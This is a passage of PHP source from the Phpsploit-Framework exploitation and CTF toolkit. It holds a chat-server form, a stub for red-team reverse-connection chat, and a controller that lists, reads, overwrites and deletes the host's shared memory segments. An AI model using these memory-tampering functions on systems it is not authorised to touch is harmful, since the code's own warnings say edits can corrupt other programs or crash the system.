                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Chat Server Environment )" ,
                    "name"  => "submit_form" ,
                    "value" => "start chat server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Chat Server Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Chat Server Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Chat_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) && ( is_integer ( $_max_connect_number ) ) && ( ( $_max_connect_number <= 100 ) ) && ( is_integer ( $_max_execute_time ) ) && ( $_max_execute_time >= 0 ) && ( is_string ( $_connect_domain_List_id ) ) ) {
            Class_Operate_ChatServer ::start ( $_listen_ip , $_listen_port , $_max_connect_number , $_max_execute_time , $_connect_domain_List_id );
        }
        return null;
    }

    public static function reverse_chat ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Combat Meeting Room (New Version)</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module still provides a typical chat environment between client and server based on the C/S architecture mode, with the main difference being that it will use rebound connections for connection communication management. This method is beneficial for the red team to engage in better activities in CTF matches, while using a traditional chat and communication environment for connection is more convenient for the blue team to communicate and communicate in CTF matches.</div>';
            $_form_top .= '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: left;font-size: 18px;color:red;">This module functionality will be implemented in a future version.</div>';
            $_form     = array (
                "submit" => array ( "display" => false ) ,
                "reset"  => array ( "display" => false ) ,
            );
            $_top      = Class_View_Top ::top ();
            $_body     = array (
                "menu"    => Class_View_Chat_Menu ::menu () ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom   = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午1:19
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Memory extends Class_Controller
{
    private static $_sizes = array (
        Class_Base_Memory::BLOCK_SIZE_8 ,
        Class_Base_Memory::BLOCK_SIZE_16 ,
        Class_Base_Memory::BLOCK_SIZE_32 ,
        Class_Base_Memory::BLOCK_SIZE_64 ,
        Class_Base_Memory::BLOCK_SIZE_128 ,
        Class_Base_Memory::BLOCK_SIZE_256 ,
        Class_Base_Memory::BLOCK_SIZE_512 ,
        Class_Base_Memory::BLOCK_SIZE_1024 ,
        Class_Base_Memory::BLOCK_SIZE_2048 ,
        Class_Base_Memory::BLOCK_SIZE_4096 ,
        Class_Base_Memory::BLOCK_SIZE_8192 ,
        Class_Base_Memory::BLOCK_SIZE_65536 ,
        Class_Base_Memory::BLOCK_SIZE_131072 ,
        Class_Base_Memory::BLOCK_SIZE_262144 ,
        Class_Base_Memory::BLOCK_SIZE_524288 ,
        Class_Base_Memory::BLOCK_SIZE_1048576 ,
    );

    private static $_block_keys = array (
        Interface_Base_BlockKey::AUTH ,
        Interface_Base_BlockKey::KEYS ,
        Interface_Base_BlockKey::INDEXES ,
        Interface_Base_BlockKey::UNIQUE_INDEX ,
        Interface_Base_BlockKey::RESERVED ,
        Interface_Base_BlockKey::SOCKETS ,
    );

    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_top    = Class_View_Top ::top ();
        $_body   = array (
            "menu"    => Class_View_Memory_Menu ::menu () ,
            "content" => "" ,
        );
        $_bottom = Class_View_Bottom ::bottom ();
        Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        return null;
    }

    public static function system ()
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_result = Class_Base_Shell ::command ( "ipcs -m" );

        if ( ! is_cli () ) {
            $_show_result = "";
            foreach ( $_result as $index => $item ) {
                $_show_result .= ( "\n" . $item . "\n" );
            }
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/memory/system" , array () );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_result_data_id = "result_data";
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Display a list of shared memory in the system</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to display the list of shared memory resources in the current system (note that due to access permissions, only the list of shared memory resources that can be accessed by the account to which the current process belongs is currently displayed).</span></div>';
            $_form           = array (
                "action"    => "/memory/system" ,
                "inputs"    => array (
                    array (
                        "id"       => "command" ,
                        "title"    => "( Command ) : " ,
                        "describe" => "IPC Command" ,
                        "name"     => "command" ,
                        "value"    => ( 'ipcs -m' ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_result_data_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_show_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;white-space: pre;padding:16px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_Memory_Menu ::menu () ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_result );
        }
        return null;
    }

    public static function show_search ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_form     = array (
                "action" => "/memory/detail" ,
                "inputs" => array (
                    array (
                        "title"    => "key : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => "" ,
                    ) ,
                ) ,
            );
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Search Share Memory Information</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to search for all available shared memory data, which can be controlled by the Phpsploit Framework software framework.</div>';
            $_top      = Class_View_Top ::top ();
            $_body     = array (
                "menu"    => Class_View_Memory_Menu ::menu () ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom   = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function show_list ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_page      = Class_Base_Request ::form ( "page" , Class_Base_Request::TYPE_INTEGER , 1 );
            $_page_size = Class_Base_Request ::form ( "page_size" , Class_Base_Request::TYPE_INTEGER , 4 );
            $_key       = Class_Base_Request ::form ( "key" , Class_Base_Request::TYPE_STRING , "" );
            $_search    = array ( "action" => "/memory/list" , "name" => "key" , "value" => $_key );
            $_map       = Class_Base_Block_Keys ::read_map ( Interface_Base_Block_Keys::KEY );
            if ( ! is_cli () ) {
                $_max_page           = 1;
                $_list               = Class_Base_Format ::map_to_list ( $_map , 3 , $_key );
                $_row_total          = count ( $_list );
                $_page_row_list      = Class_Base_Format ::list_to_page_list ( $_list , $_page , $_page_size , $_max_page );
                $_page_row_link_list = Class_Base_Format ::memory_page_list_to_memory_page_link_list ( $_page_row_list , "/memory/detail" );
                $_top                = Class_View_Top ::top ();
                $_body               = array (
                    "menu"    => Class_View_Memory_Menu ::menu () ,
                    "content" => ( Class_View_Memory ::list_table ( $_page , $_page_size , $_max_page , $_row_total , $_page_row_link_list , $_search ) ) ,
                );
                $_bottom             = Class_View_Bottom ::bottom ();
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            } else {
                Class_Base_Response ::outputln ( $_map , "block map : " );
            }
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function show_detail ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_map   = Class_Base_Block_Keys ::read_map ( Interface_Base_Block_Keys::KEY );
            $_key   = Class_Base_Request ::form ( "key" );
            $_size  = 0;
            $_value = "";
            if ( ( ! empty( $_key ) ) ) {
                foreach ( $_map as $k => $v ) {
                    if ( $k == $_key ) {
                        $_size = $v;
                        break;
                    }
                }
                $_key   = intval ( $_key );
                $_shmid = Class_Base_Memory ::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
                if ( ! empty( $_shmid ) ) {
                    $_value = Class_Base_Memory ::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , $_size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                }
            }
            if ( ! is_cli () ) {
                $_form_result = '<div style="width:100%;padding-top: 64px;"><div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Show shared memory information</div><div style="margin-bottom:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface displays data in shared memory in hexadecimal format.</div><div style="height: 32px;text-align: left;font-size: 18px;">';
                $_form_result .= empty( $_key ) ? '' : 'Shared memory key : ' . $_key;
                $_form_result .= '</div><div style="height: 32px;text-align: left;font-size:18px;">Shared memory size : ' . $_size . ' byte</div><div style="padding-top:12px;text-align: left;font-size:18px;">Shared memory data : ';
                $_form_result .= empty( $_value ) ? '' : Class_Base_Format ::htmlentities ( Class_Base_Format ::string_to_hexs_string ( $_value ) );
                $_form_result .= '</div></div>';
                $_form_result .= '<div style="width:100%;padding-top: 64px;text-align: center;"><a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/memory/edit" , array ( 'key' => $_key ) ) . '">edit</a>';
                $_form_result .= '<span style="font-size:18px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/memory/delete" , array ( 'key' => $_key ) ) . '">delete</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>';
                $_top         = Class_View_Top ::top ();
                $_body        = array (
                    "menu"    => Class_View_Memory_Menu ::menu () ,
                    "content" => ( $_form_result ) ,
                );
                $_bottom      = Class_View_Bottom ::bottom ();
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            } else {
                Class_Base_Response ::outputln ( $_key , "key : " );
                Class_Base_Response ::outputln ( $_size , "size : " );
                Class_Base_Response ::outputln ( $_value , "value : " );
            }
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function add ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key   = Class_Base_Request ::form ( "key" );
            $_value = Class_Base_Request ::form ( "value" );
            $_size  = Class_Base_Request ::form ( "size" );
            if ( ( ! empty( $_key ) ) && ( ( is_string ( $_value ) ) && ( $_value != '' ) ) && ( ! empty( $_size ) ) ) {
                if ( Class_Base_Format ::is_minlen_to_maxlen_integer ( $_key , Class_Base_Format::INTEGER_MAX_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
                    if ( ( in_array ( $_size , self ::$_sizes ) ) && ( ! in_array ( $_key , self ::$_block_keys ) ) ) {
                        $_key   = intval ( $_key );
                        $_value = substr ( Class_Base_Format ::hexs_string_to_string ( $_value ) , 0 , $_size );
                        $_value = substr ( $_value , 0 , $_size );
                        $_shmid = Class_Base_Memory ::create_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size );
                        if ( ! empty( $_shmid ) ) {
                            $_write_length = Class_Base_Memory ::write_share_memory ( $_shmid , $_value , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                            if ( ! ( empty( $_write_length ) ) ) {
                                if ( ! is_cli () ) {
                                    Class_Base_Response ::redirect ( "/memory/detail" , array ( "key" => $_key ) );
                                } else {
                                    Class_Base_Response ::outputln ( "key : " . $_key . " , size : " . $_size . " , value : " . $_value );
                                }
                                return null;
                            }
                        }
                    }
                }
            }
            $_form = array (
                "action"  => "/memory/add" ,
                "name"    => "form1" ,
                "inputs"  => array (
                    array (
                        "title"    => "key : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => ( time () . rand ( 10000000 , 99999999 ) ) ,
                    ) ,
                    array (
                        "title"    => "value : " ,
                        "describe" => "value" ,
                        "name"     => "value" ,
                        "value"    => '\x00\x00\x00\x00\x00\x00\x00\x00' ,
                    ) ,
                ) ,
                "selects" => array (
                    array (
                        "title"   => "size : " ,
                        "name"    => "size" ,
                        "options" => array () ,
                    ) ,
                ) ,
            );
            foreach ( self ::$_sizes as $k => $v ) {
                $_form[ "selects" ][ 0 ][ "options" ][] = array ( "describe" => ( $v . ( ' byte' ) ) , "title" => ( $v . ( ' byte' ) ) , "value" => $v , "selected" => ( ( 8 == $v ) ? "selected" : "" ) );
            }
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Create Share Memory Data</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">You can create shared memory data through this function. When using this function, you need to set three options (shared memory key value, shared memory size, and shared memory data). The key value of shared memory is 18 bit integer type data, and the value range is (10000000000000000 ～ 999999999999999999); The size of shared memory is in bytes, and the optional value is an integer multiple of 2 (minimum 8 bytes, maximum 1048576 bytes); Shared memory data is in hexadecimal format (single character value range: x00~ xFF), and the total number of characters in shared memory data cannot exceed the size limit of shared memory, otherwise the overflow characters will be discarded!</div>';
            $_top      = Class_View_Top ::top ();
            $_body     = array (
                "menu"    => Class_View_Memory_Menu ::menu () ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom   = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function edit ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key   = Class_Base_Request ::form ( "key" );
            $_value = Class_Base_Request ::form ( "value" );
            if ( empty( $_key ) ) {
                throw new \Exception( "Missing key request parameter: key , block key : " . $_key , 0 );
            }
            if ( ( in_array ( intval ( $_key ) , self ::$_block_keys ) ) ) {
                if ( is_cli () ) {
                    throw new \Exception( "The framework retains key values and cannot be deleted , key : " . $_key , 0 );
                } else {
                    Class_Base_Response ::redirect ( "/memory/detail" , array ( "key" => $_key ) );
                    return null;
                }
            }
            $_map = Class_Base_Block_Keys ::read_map ( Interface_Base_Block_Keys::KEY );
            if ( empty( $_map[ $_key ] ) ) {
                throw new \Exception( "block is not exist , block key : " . $_key , 0 );
            }
            $_size = $_map[ $_key ];
            if ( ( ! empty( $_key ) ) && ( ( is_string ( $_value ) ) && ( $_value != '' ) ) && ( ! empty( $_size ) ) && ( $_key != Interface_Base_Block_Keys::KEY ) ) {
                if ( Class_Base_Format ::is_minlen_to_maxlen_integer ( $_key , Class_Base_Format::INTEGER_MAX_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
                    if ( ( in_array ( $_size , self ::$_sizes ) ) && ( ! in_array ( $_key , self ::$_block_keys ) ) ) {
                        $_key   = intval ( $_key );
                        $_value = substr ( Class_Base_Format ::hexs_string_to_string ( $_value ) , 0 , $_size );
                        $_shmid = Class_Base_Memory ::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
                        if ( ! empty( $_shmid ) ) {
                            $_write_length = Class_Base_Memory ::write_share_memory ( $_shmid , Class_Base_Format ::string_to_data ( $_value , $_size ) , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                            if ( ! ( empty( $_write_length ) ) ) {
                                if ( ! is_cli () ) {
                                    Class_Base_Response ::redirect ( "/memory/detail" , array ( "key" => $_key ) );
                                } else {
                                    Class_Base_Response ::outputln ( "key : " . $_key . " , size : " . $_size . " , value : " . $_value );
                                }
                                return null;
                            }
                        }
                    }
                }
            }
            $_key   = intval ( $_key );
            $_shmid = Class_Base_Memory ::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( empty( $_shmid ) ) {
                throw new \Exception( "Shared memory does not exist , key ( " . $_key . " ) , size ( " . $_size . " ) " , 0 );
            }
            $_value = Class_Base_Memory ::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , $_size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( $_value === false ) {
                throw new \Exception( "Shared memory content read failed , key ( " . $_key . " ) , size ( " . $_size . " ) " , 0 );
            }
            $_form = array (
                "action"  => "/memory/edit" ,
                "name"    => "form1" ,
                "hiddens" => array (
                    array (
                        "name"  => "key" ,
                        "value" => $_key ,
                    ) ,
                ) ,
                "inputs"  => array (
                    array (
                        "title"    => "key : " ,
                        "describe" => "key" ,
                        "name"     => "" ,
                        "value"    => $_key ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "title"    => "value : " ,
                        "describe" => "value" ,
                        "name"     => "value" ,
                        "value"    => Class_Base_Format ::string_to_hexs_string ( $_value ) ,
                        "disabled" => "" ,
                    ) ,
                ) ,
                "selects" => array (
                    array (
                        "title"    => "size : " ,
                        "name"     => "" ,
                        "options"  => array () ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            foreach ( self ::$_sizes as $k => $v ) {
                $_form[ "selects" ][ 0 ][ "options" ][] = array ( "describe" => ( $v . ( ' byte' ) ) , "title" => ( $v . ( ' byte' ) ) , "value" => $v , "selected" => ( ( $_size == $v ) ? "selected" : "" ) );
            }
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Edit Share Memory Data</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Are you sure you want to edit this shared memory? After editing, the data in the shared memory may have unknown exceptions (for example, the memory data may have errors due to changing the original value to the wrong value), which may lead to errors in the software program that references the shared memory, or even system crash!  </div>';
            $_top      = Class_View_Top ::top ();
            $_body     = array (
                "menu"    => Class_View_Memory_Menu ::menu () ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom   = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function delete ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_time_key = "/memory/delete/csrf";
            $_key      = Class_Base_Request ::form ( "key" );
            $_delete   = Class_Base_Request ::form ( "delete" );
            $_csrf     = Class_Base_Request ::form ( "memory_delete_csrf" );
            $_map      = Class_Base_Block_Keys ::read_map ( Interface_Base_Block_Keys::KEY );
            if ( empty( $_map[ $_key ] ) ) {
                throw new \Exception( "Shared memory does not exist , key : " . $_key , 0 );
            }
            $_key  = intval ( $_key );
            $_size = $_map[ $_key ];
            if ( ( ! empty( $_key ) ) && ( ! empty( $_delete ) ) && ( ! empty( $_csrf ) ) ) {
                if ( ( in_array ( $_key , self ::$_block_keys ) ) ) {
                    if ( is_cli () ) {
                        throw new \Exception( "The framework retains key values and cannot be deleted , key : " . $_key , 0 );
                    } else {
                        Class_Base_Response ::redirect ( "/memory/delete" , array ( "key" => $_key ) );
                        return null;
                    }
                }
                if ( ( ! is_cli () ) && ( ( empty( $_SESSION[ $_time_key ] ) ) || ( $_csrf != $_SESSION[ $_time_key ] ) ) ) {
                    throw new \Exception( "Csrf token error , csrf : " . $_csrf , 0 );
                }
                $_deleted = Class_Base_Memory ::delete_share_memory_by_key ( $_key , $_size );
                if ( ! $_deleted ) {
                    throw new \Exception( "Shared memory deletion failed , key : " . $_key , 0 );
                }
                $_SESSION[ $_time_key ] = null;
                if ( ! is_cli () ) {
                    Class_Base_Response ::redirect ( "/memory/list" );
                } else {
                    Class_Base_Response ::outputln ( "Shared memory deleted successfully , key ( " . $_key . " ) , size ( " . $_size . " ) " , 0 );
                }
                return null;
            }
            $_shmid = Class_Base_Memory ::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! empty( $_shmid ) ) {
                $_value = Class_Base_Memory ::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , $_size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            }
            if ( ! is_cli () ) {
                $_form_result = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Delete Share Memory Data</div>';
                $_form_result .= '<div style="width:100%;padding-top: 16px;padding-bottom: 16px;"><div style="height: 64px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Are you sure you want to delete this shared memory? After deletion, the data in this shared memory cannot be recovered! </span>Confirm the deletion operation (select "<span style="font-size: 18px;color:red;">delete</span>"), otherwise select (select "<span style="font-size: 18px;color:blue;">back</span>").</div><div style="margin-top:32px;height: 32px;text-align: center;font-size: 18px;">Shared memory information</div><div style="width:100%;padding-top: 16px;padding-bottom:32px;text-align: left;"><span style="font-size: 18px;color:red;">prompt: Because there may be invisible characters (special characters, control character, etc.) in the content stored in shared memory, the current shared memory content will be displayed in hexadecimal form!</span></div><div style="height: 32px;text-align: left;font-size: 18px;">';
                $_form_result .= empty( $_key ) ? '' : 'Shared memory key : ' . $_key;
                $_form_result .= '</div><div style="height: 32px;text-align: left;font-size:18px;">Shared memory size : ' . $_size . ' byte</div><div style="text-align: left;font-size:18px;">Shared memory data : ';
                $_form_result .= empty( $_value ) ? '' : Class_Base_Format ::htmlentities ( Class_Base_Format ::string_to_hexs_string ( $_value ) );
                $_form_result .= '</div></div>';
                $_form_result .= '<div style="width:100%;padding-top: 64px;text-align: center;"><a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/memory/delete" , array ( 'key' => $_key , 'delete' => 1 , 'memory_delete_csrf' => $_SESSION[ $_time_key ] = ( time () . rand ( 10000000 , 99999999 ) ) ) ) . '">delete</a>';
                $_form_result .= '<span style="font-size:18px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/memory/detail" , array ( 'key' => $_key , 'csrf' => $_SESSION[ "/memory/detail/time" ] = ( time () . rand ( 10000000 , 99999999 ) ) ) ) . '">back</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>';
                $_top         = Class_View_Top ::top ();
                $_body        = array (
                    "menu"    => Class_View_Memory_Menu ::menu () ,
                    "content" => ( $_form_result ) ,
                );
                $_bottom      = Class_View_Bottom ::bottom ();
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            } else {
